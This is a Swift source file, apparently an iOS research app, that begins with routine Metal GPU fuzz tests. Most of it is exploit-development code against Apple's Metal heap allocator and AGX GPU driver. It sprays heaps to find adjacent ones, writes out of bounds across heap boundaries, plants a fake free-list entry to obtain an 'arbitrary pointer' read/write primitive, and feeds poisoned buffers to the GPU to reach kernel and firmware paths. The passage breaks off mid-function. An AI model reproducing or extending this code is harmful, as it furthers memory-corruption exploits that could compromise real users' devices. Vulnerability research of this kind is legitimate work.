import Metal
import IOSurface
import Foundation

// Synchronous file logger — survives app crashes.
// Writes to Documents/metal_crash_log.txt before each operation.
// If the app crashes mid-fuzz, this file shows the last line executed.
class SyncLog {
    private let handle: FileHandle?
    static let logURL: URL = {
        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
            .appendingPathComponent("metal_crash_log.txt")
    }()

    init() {
        FileManager.default.createFile(atPath: Self.logURL.path, contents: "=== Metal Fuzz Log ===\n".data(using: .utf8))
        handle = try? FileHandle(forWritingTo: Self.logURL)
        handle?.seekToEndOfFile()
    }

    func write(_ s: String) {
        guard let h = handle else { return }
        if let data = (s + "\n").data(using: .utf8) {
            h.write(data)
            h.synchronizeFile()   // flush to kernel immediately
        }
    }

    deinit { try? handle?.close() }

    static func read() -> String {
        (try? String(contentsOf: logURL, encoding: .utf8)) ?? "(no crash log found)"
    }
}

func runMetalFuzz(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()

        func step(_ s: String) {
            sl.write(s)
            log.append(s)
        }

        guard let device = MTLCreateSystemDefaultDevice(),
              let queue  = device.makeCommandQueue() else {
            step("✗ No Metal device"); completion(); return
        }
        step("Metal: \(device.name)")

        // ── 1. IOSurface alloc ───────────────────────────────────────────
        step("[1/6] IOSurface alloc")
        let surfCases: [(String, [IOSurfacePropertyKey: Any])] = [
            ("1x1",    [.width:1,   .height:1,   .bytesPerElement:4, .bytesPerRow:4,    .allocSize:4]),
            ("64x64",  [.width:64,  .height:64,  .bytesPerElement:4, .bytesPerRow:256,  .allocSize:16384]),
            ("256x256",[.width:256, .height:256, .bytesPerElement:4, .bytesPerRow:1024, .allocSize:262144]),
            ("13x7",   [.width:13,  .height:7,   .bytesPerElement:4, .bytesPerRow:52,   .allocSize:364]),
        ]
        for (label, props) in surfCases {
            autoreleasepool {
                step("  [surf] \(label) — allocating")
                guard let s = IOSurface(properties: props) else {
                    step("    nil"); return
                }
                step("    alloc OK — locking")
                var seed: UInt32 = 0xCAFEBABE
                let lk = s.lock(options: [], seed: &seed)
                step("    lock=\(lk) — unlocking")
                let uk = s.unlock(options: [], seed: &seed)
                step("    unlock=\(uk) seed=0x\(String(seed,radix:16))")
            }
        }

        // ── 2. Buffer page boundaries ────────────────────────────────────
        step("[2/6] Buffer boundaries")
        for sz in [0x3FFF, 0x4000, 0x4001, 0xFFFF, 0x100000] {
            autoreleasepool {
                step("  [buf] 0x\(String(sz,radix:16)) — makeBuffer")
                guard let buf = device.makeBuffer(length: sz, options: .storageModeShared) else {
                    step("    nil"); return
                }
                let actual = buf.length
                step("    actual=0x\(String(actual,radix:16)) — writing boundary bytes")
                let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
                ptr[sz - 1] = 0xEE
                if actual > sz { ptr[actual - 1] = 0xFF }
                step("    done pad=\(actual-sz)")
            }
        }

        // ── 3. IOSurface-backed texture ──────────────────────────────────
        step("[3/6] IOSurface-backed textures")
        autoreleasepool {
            step("  [tex] matched 128x128 — surf alloc")
            guard let surf = IOSurface(properties: [
                .width:128,.height:128,.bytesPerElement:4,.bytesPerRow:512,.allocSize:65536
            ]) else { step("    surf nil"); return }
            step("  [tex] matched — makeTexture")
            let td = MTLTextureDescriptor.texture2DDescriptor(
                pixelFormat:.bgra8Unorm, width:128, height:128, mipmapped:false)
            td.storageMode = .shared
            let tex = device.makeTexture(descriptor: td, iosurface: surf, plane: 0)
            step("    tex=\(tex==nil ? "nil" : "OK")")
        }
        // MISMATCH test skipped in auto-flow — it calls abort() (SIGABRT), not catchable.
        // Use the dedicated "MISMATCH" button to run it deliberately.
        step("  [tex] MISMATCH skipped — use MISMATCH button (kills process via abort)")

        // ── 4. Blit encoder ──────────────────────────────────────────────
        step("[4/6] Blit encoder")
        autoreleasepool {
            step("  [blit] fill 4096 — makeCommandBuffer")
            guard let buf = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeBlitCommandEncoder() else { step("  setup nil"); return }
            step("  [blit] fill — encoding")
            enc.fill(buffer: buf, range: 0..<4096, value: 0xAB)
            enc.endEncoding()
            step("  [blit] fill — commit")
            cmd.commit(); cmd.waitUntilCompleted()
            let ptr = buf.contents().assumingMemoryBound(to: UInt8.self)
            step("  fill result: \(ptr[0]==0xAB && ptr[4095]==0xAB ? "OK" : "MISMATCH")")
        }
        autoreleasepool {
            step("  [blit] copy — setup")
            guard let src = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let dst = device.makeBuffer(length: 4096, options: .storageModeShared),
                  let cmd = queue.makeCommandBuffer(),
                  let enc = cmd.makeBlitCommandEncoder() else { return }
            src.contents().assumingMemoryBound(to: UInt8.self)[0] = 0x42
            step("  [blit] copy — encoding")
            enc.copy(from: src, sourceOffset: 0, to: dst, destinationOffset: 0, size: 4096)
            enc.endEncoding()
            step("  [blit] copy — commit")
            cmd.commit(); cmd.waitUntilCompleted()
            let ok = dst.contents().assumingMemoryBound(to: UInt8.self)[0] == 0x42
            step("  copy status=\(cmd.status.rawValue) verify=\(ok)")
        }

        // ── 5. MTLHeap ───────────────────────────────────────────────────
        step("[5/6] MTLHeap")
        for sz in [4096, 0x10000] {
            autoreleasepool {
                step("  [heap] 0x\(String(sz,radix:16)) — makeHeap")
                let hd = MTLHeapDescriptor(); hd.size = sz; hd.storageMode = .shared
                guard let heap = device.makeHeap(descriptor: hd) else {
                    step("    nil"); return
                }
                step("  [heap] actual=\(heap.size) — suballoc x16")
                var bufs: [MTLBuffer] = []
                for _ in 0..<16 {
                    if let b = heap.makeBuffer(length: 256, options: .storageModeShared) { bufs.append(b) }
                }
                let n = bufs.count
                step("  [heap] sub=\(n) — releasing all")
                bufs.removeAll()
                step("  [heap] — realloc after free")
                let b2 = heap.makeBuffer(length: 128, options: .storageModeShared)
                step("    realloc=\(b2==nil ? "nil":"OK")")
            }
        }

        // ── 6. Rapid IOSurface ───────────────────────────────────────────
        step("[6/6] Rapid IOSurface 512x512 x30")
        var ok = 0; var fail = 0
        for i in 0..<30 {
            autoreleasepool {
                step("  [rapid] iter \(i)")
                guard let s = IOSurface(properties: [
                    .width:512,.height:512,.bytesPerElement:4,.bytesPerRow:2048,.allocSize:1048576
                ]) else { fail += 1; return }
                var seed: UInt32 = 0
                let _ = s.lock(options: [], seed: &seed)
                let _ = s.unlock(options: [], seed: &seed)
                ok += 1
            }
        }
        step("  created=\(ok) failed=\(fail)")
        step("── Metal fuzz complete ─────────────────────")
        completion()
    }
}

// Heap allocator confusion attack.
//
// Chain so far:
//   ✓ h0 OOB write → h1's memory (64/64 bytes confirmed)
//
// This step: corrupt h1's INTERNAL ALLOCATOR STATE before any h1 alloc,
// then call h1.makeBuffer() — if Metal's free list reads our planted bytes,
// the returned buffer's contents() lands at attacker-controlled address.
//
// Phase 1: alloc h0 (fills, establishes adjacency), leave h1 EMPTY
// Phase 2: snapshot h1's raw bytes via h0 OOB (read allocator metadata)
// Phase 3: log any pointer-class values in the snapshot (0x1xxxxxxxx pattern)
// Phase 4: plant a fake free-list entry pointing at h2's VA
// Phase 5: call h1.makeBuffer() — log the returned contents() pointer
// Phase 6: check if it left h1's normal range → arbitrary pointer confirmed
func runAllocatorConfusion(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Allocator Confusion ─────────────────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared

        // Alloc h0 FULLY — establishes h0→h1 adjacency
        guard let h0 = device.makeHeap(descriptor: hd) else { step("h0 nil"); completion(); return }
        let actual = h0.size
        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        step("h0 va=0x\(String(va0,radix:16)) actual=\(actual)")

        // h1 — leave EMPTY (no suballoc yet — allocator state is pristine)
        // VA derived: spray confirmed heaps are contiguous at exactly actual_size spacing
        guard let h1 = device.makeHeap(descriptor: hd) else { step("h1 nil"); completion(); return }
        let va1_heap = va0 + UInt(actual)
        step("h1 va (derived)=0x\(String(va1_heap,radix:16))")

        // h2 — alloc fully — this is our target VA we want to redirect h1 into
        guard let h2 = device.makeHeap(descriptor: hd) else { step("h2 nil"); completion(); return }
        guard let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("b2 nil"); completion(); return }
        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)
        let va2 = UInt(bitPattern: p2)
        step("h2 va=0x\(String(va2,radix:16))")

        // Verify adjacency: h0 end == h1 start?
        let dist = va1_heap > va0 ? va1_heap - va0 : va0 - va1_heap
        step("dist h0→h1 = 0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("not adjacent this run — retry"); completion(); return }

        // Phase 2: snapshot h1's first 256 bytes via h0 OOB (before any h1 alloc)
        step("── Snapshot h1 allocator state (256 bytes) ──")
        var snapshot = [UInt8](repeating: 0, count: 256)
        for i in 0..<256 { snapshot[i] = p0[actual + i] }

        // Hex dump: 16 rows × 16 bytes
        for row in 0..<16 {
            let slice = snapshot[(row*16)..<(row*16+16)]
            let hex = slice.map { String(format:"%02x", $0) }.joined(separator:" ")
            step("  +\(String(format:"%03x", row*16)): \(hex)")
        }

        // Phase 3: scan for pointer-class values (8-byte aligned, 0x1xxxxxxxx range)
        step("── Pointer scan ──────────────────────────────")
        var foundPtrs = 0
        for off in stride(from: 0, to: 248, by: 8) {
            var val: UInt64 = 0
            for b in 0..<8 { val |= UInt64(snapshot[off+b]) << (b*8) }
            if val > 0x100000000 && val < 0x200000000 {
                step("  +0x\(String(format:"%02x",off)): 0x\(String(val,radix:16)) ← PTR-CLASS")
                foundPtrs += 1
            }
        }
        step("  ptr-class values found: \(foundPtrs)")

        // Phase 4: plant fake free-list entry
        // CONFIRMED formula: returned = planted - actual (no dereference, direct subtraction).
        // Stage A was wrong — allocator doesn't dereference. Just plant va2+actual so returned=va2.
        let plantVal2 = va2 + UInt(actual)
        step("── Plant va2+actual=0x\(String(plantVal2,radix:16)) → expect returned=va2=0x\(String(va2,radix:16))")
        var plantVal = plantVal2
        for i in 0..<8 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8 }
        plantVal = plantVal2
        for i in 8..<32 { p0[actual + i] = UInt8(plantVal & 0xFF); plantVal >>= 8; if i % 8 == 7 { plantVal = plantVal2 } }

        // Phase 5: trigger allocator — call makeBuffer on corrupted h1
        step("── h1.makeBuffer(256) with corrupted free-list")
        let confused = h1.makeBuffer(length: 256, options: .storageModeShared)
        if let cb = confused {
            let cva = UInt(bitPattern: cb.contents())
            step("  returned va=0x\(String(cva,radix:16))")
            let normalRange = va1_heap...(va1_heap + UInt(actual))
            if normalRange.contains(cva) {
                step("  within h1 normal range — allocator robust against this overwrite")
            } else if cva >= va2 && cva < va2 + UInt(actual) {
                step("  *** IN h2 RANGE — ARBITRARY POINTER CONFIRMED ***")
                step("  *** makeBuffer returned h2's memory — full r/w primitive ***")
                step("  *** cva=0x\(String(cva,radix:16)) va2=0x\(String(va2,radix:16)) offset=\(cva - va2)")
            } else {
                let delta = cva > va2 ? cva - va2 : va2 - cva
                step("  OUTSIDE — cva=0x\(String(cva,radix:16)) delta_from_va2=\(Int(bitPattern: cva) - Int(bitPattern: va2))")
                step("  partial primitive — allocator read our plant but arithmetic still off by 0x\(String(delta,radix:16))")
            }
        } else {
            step("  nil — heap corrupted/exhausted")
        }

        step("── Allocator Confusion complete ────────────")
        completion()
    }
}

// Argument buffer corruption via OOB heap write.
// Alloc h0+h1 adjacent. Create an argument buffer in h1 encoding a live texture.
// Corrupt the argument buffer's encoded handle via h0 OOB write.
// Submit a GPU compute pass reading from the corrupted argument buffer.
// If AGX dereferences the corrupted handle → GPU fault → AGX kernel path hit.
func runArgBufferCorruption(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
        step("── ArgBuffer Corruption ──────────────────")

        // Use SAME approach as confirmed boundary cross:
        // alloc h0+h1+h2 sequentially, check adjacency, write via p0 OOB into h1.
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size

        // Fill h0 fully → establishes OOB boundary at h1
        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared) else { step("b0 nil"); completion(); return }
        // Fill h1 with victim buffer (this is what we'll corrupt then submit to GPU)
        guard let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("b1 nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let dist = va1 > va0 ? va1 - va0 : va0 - va1
        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")

        guard dist == UInt(actual) else {
            step("✗ not adjacent (dist=0x\(String(dist,radix:16))) — retry"); completion(); return
        }
        step("✓ adjacent — OOB write path confirmed")

        // Fill h1 with sentinel, verify OOB read from h0 hits it
        for i in 0..<actual { p1[i] = 0xAA }
        let probe = p0[actual]
        step("probe p0[\(actual)] = 0x\(String(probe,radix:16))")
        guard probe == 0xAA else { step("✗ sentinel not reached — layout shifted"); completion(); return }
        step("✓ cross-heap read confirmed")

        // Write 64 bytes of poison into h1[0..63] via h0 OOB
        // 0xDEADBEEFCAFEBABE pattern — will be in the buffer AGX reads during GPU command processing
        let poison: [UInt8] = [0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE,
                                0xDE,0xAD,0xBE,0xEF,0xCA,0xFE,0xBA,0xBE]
        step("── Writing 64 bytes of poison into h1[0..63] via h0 OOB ──")
        for i in 0..<64 { p0[actual + i] = poison[i] }

        // Verify via p1 (direct)
        var hits = 0
        for i in 0..<64 { if p1[i] == poison[i % 8] { hits += 1 } }
        step("  verify via p1: \(hits)/64 bytes confirmed")
        guard hits > 0 else { step("✗ poison didn't land in h1"); completion(); return }
        step("✓ h1 buffer is now poisoned with attacker data")

        // Submit GPU blit command using the POISONED h1 buffer.
        // AGX kernel driver reads b1's contents when scheduling the GPU command.
        // If AGX dereferences our poison as a resource handle → GPU fault → kernel path.
        step("── Submitting GPU blit on poisoned h1 buffer ──")
        guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }
        guard let blit = cmdBuf.makeBlitCommandEncoder() else { step("blit nil"); completion(); return }

        // Fill blit: copy h1[0..7] → h1[8..15]. AGX must read h1's descriptor during scheduling.
        blit.copy(from: b1, sourceOffset: 0, to: b1, destinationOffset: 8, size: 8)
        blit.endEncoding()

        cmdBuf.addCompletedHandler { cb in
            let status = cb.status
            let err    = cb.error?.localizedDescription ?? "none"
            switch status {
            case .completed:
                step("  cmdBuf COMPLETED — AGX processed poisoned buffer without fault")
                step("  AGX validates buffer VA, not contents — contents corruption is GPU-data-plane only")
                // Verify: did AGX actually copy our poison bytes?
                var after = [UInt8](repeating: 0, count: 8)
                for i in 0..<8 { after[i] = p1[8 + i] }
                step("  h1[8..15] after blit: \(after.map{String(format:"%02x",$0)}.joined(separator:" "))")
                if after == Array(poison[0..<8]) {
                    step("  *** POISON PROPAGATED: AGX copied 0xDEADBEEF bytes in GPU command ***")
                    step("  *** If b1 were used as indirect cmd buffer / arg buffer, this corrupts GPU state ***")
                }
            case .error:
                step("  *** cmdBuf ERROR — AGX faulted on poisoned buffer")
                step("  *** error: \(err)")
                step("  *** AGX KERNEL PATH HIT — driver read our OOB-written bytes")
            default:
                step("  cmdBuf status=\(status.rawValue) err=\(err)")
            }
            step("── ArgBuffer Corruption complete ────────────")
            completion()
        }

        step("  commit…")
        cmdBuf.commit()
    }
}

// Indirect dispatch corruption.
// Write 0xDEADBEEF into h1 via OOB, then use h1 as an indirect dispatch buffer.
// AGX kernel scheduler reads the buffer to get thread grid dimensions before GPU launch.
// Poison bytes (3.7B thread groups) → either AGX driver integer overflow or GPU hang/watchdog.
func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }

        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        guard let queue  = device.makeCommandQueue() else { step("✗ No command queue"); completion(); return }
        step("── GPU Indirect Dispatch Corruption ─────────")

        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
        let actual = h0.size

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let dist = va1 > va0 ? va1 - va0 : va0 - va1

        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
        step("✓ adjacent")

        // Verify cross-heap read
        for i in 0..<actual { p1[i] = 0xAA }
        guard p0[actual] == 0xAA else { step("✗ sentinel miss"); completion(); return }
        step("✓ cross-heap read confirmed")

        // MTLDispatchThreadgroupsIndirectArguments layout:
        // uint32 threadgroupsX, uint32 threadgroupsY, uint32 threadgroupsZ  (12 bytes total)
        // Write 0xDEADBEEF into all three fields via h0 OOB
        let poisonU32: UInt32 = 0xDEADBEEF
        step("── Writing indirect dispatch args via h0 OOB ──")
        step("  poisoning threadgroupsX/Y/Z = 0x\(String(poisonU32,radix:16)) each")
        // Write 3 × UInt32 little-endian into h1[0..11]
        for field in 0..<3 {
            var v = poisonU32
            for b in 0..<4 {
                p0[actual + field*4 + b] = UInt8(v & 0xFF)
                v >>= 8
            }
        }
        // Verify
        var readback: UInt32 = 0
        for b in 0..<4 { readback |= UInt32(p1[b]) << (b*8) }
        step("  h1[0..3] readback = 0x\(String(readback,radix:16)) (expect 0xdeadbeef)")

        // Build a trivial Metal compute pipeline (empty kernel)
        // Must have a real compiled function — use a precompiled library approach:
        // simplest: device.makeDefaultLibrary() looks for default.metallib in the bundle.
        // If not present, use makeComputePipelineState with a dynamic-compiled function.
        let src = """
        #include <metal_stdlib>
        using namespace metal;
        kernel void noop(uint id [[thread_position_in_grid]]) {}
        """
        step("── Compiling noop compute shader ──")
        let lib: MTLLibrary
        let fn:  MTLFunction
        let pso: MTLComputePipelineState
        do {
            let opts = MTLCompileOptions()
            lib = try device.makeLibrary(source: src, options: opts)
            guard let f = lib.makeFunction(named: "noop") else { step("fn nil"); completion(); return }
            fn  = f
            pso = try device.makeComputePipelineState(function: fn)
        } catch {
            step("✗ shader compile failed: \(error.localizedDescription)"); completion(); return
        }
        step("  shader compiled OK")

        // Encode indirect dispatch using b1 as the indirect args buffer (contains our poison)
        guard let cmdBuf = queue.makeCommandBuffer() else { step("cmdBuf nil"); completion(); return }
        guard let enc = cmdBuf.makeComputeCommandEncoder() else { step("enc nil"); completion(); return }
        enc.setComputePipelineState(pso)
        // dispatchThreadgroups(indirectBuffer:) — AGX kernel reads b1[0..11] as grid size
        enc.dispatchThreadgroups(indirectBuffer: b1,
                                  indirectBufferOffset: 0,
                                  threadsPerThreadgroup: MTLSize(width: 1, height: 1, depth: 1))
        enc.endEncoding()

        cmdBuf.addCompletedHandler { cb in
            let status = cb.status
            let err    = cb.error?.localizedDescription ?? "none"
            switch status {
            case .completed:
                step("  cmdBuf COMPLETED — AGX accepted 0xDEADBEEF thread groups without fault")
                step("  AGX either clamped or dispatched the value (GPU firmware handled it)")
            case .error:
                step("  *** cmdBuf ERROR — AGX faulted on 0xDEADBEEF indirect dispatch")
                step("  *** error: \(err)")
                step("  *** AGX KERNEL/FIRMWARE PATH HIT — scheduler read our OOB bytes as grid dimensions")
            default:
                step("  status=\(status.rawValue) err=\(err)")
            }
            step("── Indirect Dispatch Corruption complete ─────")
            completion()
        }

        step("  commit (dispatching 0x\(String(poisonU32,radix:16))^3 thread groups)…")
        sl.write("LAST STEP BEFORE GPU SUBMIT — if crash here, AGX scheduler faulted")
        cmdBuf.commit()
    }
}

// Heap boundary cross test.
// Heaps are spaced exactly actual_size=16384 bytes apart (confirmed via spray).
// Heaps are CONTIGUOUS — no padding. ptr[actual_size] of heap[0] = ptr[0] of heap[1].
// Swift raw pointer writes don't bounds-check. Test if a one-past-end write
// from heap[0] lands in heap[1]'s backing memory.
func runHeapBoundaryCross(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Boundary Cross ─────────────────────")

        // Alloc 3 heaps — use middle one as victim so both sides are controlled
        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
        guard let h0 = device.makeHeap(descriptor: hd),
              let h1 = device.makeHeap(descriptor: hd),
              let h2 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }

        let actual = h0.size
        step("actual=\(actual)")

        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared),
              let b2 = h2.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }

        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
        let p2 = b2.contents().assumingMemoryBound(to: UInt8.self)

        let va0 = UInt(bitPattern: p0)
        let va1 = UInt(bitPattern: p1)
        let va2 = UInt(bitPattern: p2)
        step("va0=0x\(String(va0,radix:16))")
        step("va1=0x\(String(va1,radix:16)) dist=0x\(String(va1>va0 ? va1-va0 : va0-va1, radix:16))")
        step("va2=0x\(String(va2,radix:16)) dist=0x\(String(va2>va1 ? va2-va1 : va1-va2, radix:16))")

        // Compute distances — only probe pairs that are actually adjacent
        let dist01 = va1 > va0 ? va1 - va0 : va0 - va1
        let dist12 = va2 > va1 ? va2 - va1 : va1 - va2

        // Fill h1 (victim) with sentinel
        for i in 0..<actual { p0[i] = 0x00; p1[i] = 0xAA; p2[i] = 0x00 }
        step("h1 filled 0xAA. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")

        // Only read p0[actual] if h0→h1 are contiguous (dist == actual)
        if dist01 == UInt(actual) {
            step("h0→h1 contiguous — reading p0[\(actual)]")
            let v = p0[actual]
            step("p0[\(actual)] = 0x\(String(v, radix:16))")
            if v == 0xAA {
                step("*** CROSS-HEAP READ: h0 OOB hits h1 ***")
                // Write confirm: stamp 0xBB into h1 via h0 OOB
                for i in 0..<64 { p0[actual + i] = 0xBB }
                var hits = 0
                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h0 OOB ***")
                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
            } else {
                step("read 0x\(String(v,radix:16)) — not sentinel, layout shifted")
            }
        }

        // Only read p2[actual] if h2→h1 are contiguous
        if dist12 == UInt(actual) && (va2 < va1) {
            step("h2→h1 contiguous — reading p2[\(actual)]")
            let v = p2[actual]
            step("p2[\(actual)] = 0x\(String(v, radix:16))")
            if v == 0xAA {
                step("*** CROSS-HEAP READ: h2 OOB hits h1 ***")
                for i in 0..<64 { p2[actual + i] = 0xBB }
                var hits = 0
                for i in 0..<actual { if p1[i] == 0xBB { hits += 1 } }
                step("*** CROSS-HEAP WRITE: \(hits)/64 bytes of h1 corrupted via h2 OOB ***")
                if hits > 0 { step("*** PRIMITIVE CONFIRMED: controlled write across heap boundary ***") }
            }
        }

        if dist01 != UInt(actual) && !(dist12 == UInt(actual) && va2 < va1) {
            step("no adjacent pair this run. dist01=0x\(String(dist01,radix:16)) dist12=0x\(String(dist12,radix:16))")
        }

        step("── Heap Boundary Cross complete ────────────")
        completion()
    }
}

// Heap spray adjacency test.
// Alloc N heaps, record their VA addresses, find closest pair.
// If any two heaps land within actual_size bytes of each other → cross-heap write.
func runHeapSpray(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Spray Adjacency ────────────────────")

        let N = 64
        let declaredSize = 4096

        // Alloc N heaps + full-actual buffers, record VA
        var heaps:  [MTLHeap]   = []
        var bufs:   [MTLBuffer] = []
        var addrs:  [UInt]      = []

        for i in 0..<N {
            autoreleasepool {
                let hd = MTLHeapDescriptor(); hd.size = declaredSize; hd.storageMode = .shared
                guard let h = device.makeHeap(descriptor: hd),
                      let b = h.makeBuffer(length: h.size, options: .storageModeShared) else { return }
                let va = UInt(bitPattern: b.contents())
                heaps.append(h); bufs.append(b); addrs.append(va)
                if i % 16 == 0 { step("  alloc \(i)/\(N) va=0x\(String(va, radix:16))") }
            }
        }
        step("  total heaps=\(heaps.count)")

        // Find closest pair
        var minDist: UInt = UInt.max
        var minI = 0, minJ = 0
        for i in 0..<addrs.count {
            for j in (i+1)..<addrs.count {
                let d = addrs[j] > addrs[i] ? addrs[j] - addrs[i] : addrs[i] - addrs[j]
                if d < minDist { minDist = d; minI = i; minJ = j }
            }
        }

        let actual = heaps.first?.size ?? 16384
        step("  closest pair: heap[\(minI)] heap[\(minJ)] dist=0x\(String(minDist, radix:16)) (\(minDist)B)")
        step("  actual_size=\(actual) — need dist < \(actual) for overlap")

        if minDist < UInt(actual) {
            step("  *** OVERLAP FOUND — dist \(minDist) < actual \(actual) ***")

            // Write sentinel to heap[minJ], scan heap[minI]'s OOB region
            let pI = bufs[minI].contents().assumingMemoryBound(to: UInt8.self)
            let pJ = bufs[minJ].contents().assumingMemoryBound(to: UInt8.self)
            let lenI = bufs[minI].length
            let lenJ = bufs[minJ].length

            for k in 0..<lenJ { pJ[k] = 0xAD }
            var hits = 0
            for k in declaredSize..<lenI { if pI[k] == 0xAD { hits += 1 } }
            step("  sentinel scan: \(hits)/\(lenI - declaredSize) OOB bytes match heap[\(minJ)]")

            if hits > 0 {
                step("  *** CROSS-HEAP READ CONFIRMED ***")
                for k in declaredSize..<lenI { pI[k] = 0xBE }
                var wHits = 0
                for k in 0..<lenJ { if pJ[k] == 0xBE { wHits += 1 } }
                step("  *** CROSS-HEAP WRITE CONFIRMED: \(wHits) bytes corrupted ***")
            }
        } else {
            // Log VA distribution — useful for understanding allocator layout
            let sorted = addrs.sorted()
            var gaps: [UInt] = []
            for i in 1..<sorted.count { gaps.append(sorted[i] - sorted[i-1]) }
            let minGap = gaps.min() ?? 0
            let maxGap = gaps.max() ?? 0
            step("  no overlap. gap range: 0x\(String(minGap,radix:16))..0x\(String(maxGap,radix:16))")
            step("  need \(Int(minGap) / actual)x more heaps to fill one gap")
            // Log first 8 sorted VAs for pattern analysis
            for i in 0..<min(8, sorted.count) {
                step("  va[\(i)]=0x\(String(sorted[i], radix:16))")
            }
        }

        heaps.removeAll(); bufs.removeAll()
        step("── Heap Spray complete ─────────────────────")
        completion()
    }
}

// Two-heap adjacency test.
// Alloc heap1 and heap2 back-to-back. Write sentinel pattern into heap2's
// buffer via heap2 API. Then read heap1's OOB region (past hd.size up to
// actual) — if the sentinel appears, heap1's OOB region physically overlaps
// heap2's backing store. That means heap1 OOB write → heap2 data corruption.
func runHeapAdjacency(log: FuzzLog, completion: @escaping () -> Void) {
    DispatchQueue.global(qos: .userInitiated).async {
        let sl = SyncLog()
        func step(_ s: String) { sl.write(s); log.append(s) }
        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
        step("── Heap Adjacency Test ─────────────────────")

        // Try multiple pairs — allocator placement varies
        for trial in 0..<8 {
            autoreleasepool {
                step("  [trial \(trial)]")
                let hd1 = MTLHeapDescriptor(); hd1.size = 4096; hd1.storageMode = .shared
                let hd2 = MTLHeapDescriptor(); hd2.size = 4096; hd2.storageMode = .shared
                guard let h1 = device.makeHeap(descriptor: hd1),
                      let h2 = device.makeHeap(descriptor: hd2) else { step("  heap nil"); return }

                let actual1 = h1.size
                let actual2 = h2.size
